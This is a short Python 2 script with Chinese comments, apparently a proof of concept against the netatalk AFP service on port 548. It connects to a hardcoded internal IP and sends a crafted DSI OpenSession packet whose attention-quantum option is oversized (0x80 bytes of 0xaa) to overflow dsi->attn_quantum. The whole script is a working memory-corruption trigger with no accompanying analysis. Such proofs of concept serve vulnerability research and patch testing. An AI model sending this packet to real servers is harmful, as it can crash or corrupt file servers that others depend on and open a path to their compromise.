#!/usr/bin/python
# -*- coding: UTF-8 -*-

import socket
import struct

ip = "10.150.252.25"
port = 548
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

# 设置 commands ， 溢出 dsi->attn_quantum
commands = "\x01"  # DSIOPT_ATTNQUANT 选项的值
commands += "\x80"  # 数据长度
commands += "\xaa" * 0x80


header = "\x00"  # "request" flag ， dsi_flags
header += "\x04"  # open session command ， dsi_command
header += "\x00\x01"  # request id, dsi_requestID
header += "\x00\x00\x00\x00"  # dsi_data
header += struct.pack(">I", len(commands))  # dsi_len , 后面 commands 数据的长度
header += "\x00\x00\x00\x00"  # reserved

header += commands
sock.sendall(header)

print sock.recv(1024)
